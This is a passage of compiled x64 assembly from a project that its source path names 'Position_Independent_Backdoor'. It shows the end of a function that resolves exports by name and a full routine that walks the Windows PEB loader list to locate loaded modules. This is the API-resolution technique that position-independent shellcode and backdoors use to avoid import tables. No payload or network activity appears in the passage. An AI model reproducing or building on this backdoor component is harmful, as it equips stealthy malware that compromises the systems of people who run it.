	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 136
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 138
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 139
	xor	eax, eax
$LN1@get_func_b:
; Line 140
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv136 = 8
tv155 = 10
c1$2 = 12
c2$3 = 16
curr_name$4 = 24
curr_module$ = 32
tv132 = 40
tv151 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
; Line 69
$LN16:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN15@get_module:
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN11@get_module
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv132[rsp], eax
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv132[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv132[rsp]
	mov	WORD PTR tv136[rsp], ax
	jmp	SHORT $LN12@get_module
$LN11@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv136[rsp], ax
$LN12@get_module:
	movzx	eax, WORD PTR tv136[rsp]
	mov	WORD PTR c1$2[rsp], ax
; Line 90
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 90					; 0000005aH
	jg	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	cmp	eax, 65					; 00000041H
	jl	SHORT $LN13@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	sub	eax, 65					; 00000041H
	add	eax, 97					; 00000061H
	mov	DWORD PTR tv151[rsp], eax
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	edx, WORD PTR tv151[rsp]
	mov	WORD PTR [rax+rcx*2], dx
	movzx	eax, WORD PTR tv151[rsp]
	mov	WORD PTR tv155[rsp], ax
	jmp	SHORT $LN14@get_module
$LN13@get_module:
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	mov	WORD PTR tv155[rsp], ax
$LN14@get_module:
	movzx	eax, WORD PTR tv155[rsp]
	mov	WORD PTR c2$3[rsp], ax
; Line 91
	movzx	eax, WORD PTR c1$2[rsp]
	movzx	ecx, WORD PTR c2$3[rsp]
	cmp	eax, ecx
	je	SHORT $LN8@get_module
	jmp	SHORT $LN5@get_module
$LN8@get_module:
; Line 92
	jmp	$LN4@get_module
$LN5@get_module:
; Line 93
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	jne	SHORT $LN9@get_module
; Line 95
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+48]
	jmp	SHORT $LN1@get_module
$LN9@get_module:
; Line 98
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	QWORD PTR curr_module$[rsp], rax
; Line 99
	jmp	$LN15@get_module
$LN3@get_module:
; Line 100
	xor	eax, eax
$LN1@get_module:
; Line 101
	add	rsp, 104				; 00000068H
	pop	rdi
	pop	rsi
	ret	0
?get_module_by_name@@YAPEAXPEA_W@Z ENDP			; get_module_by_name
_TEXT	ENDS
END
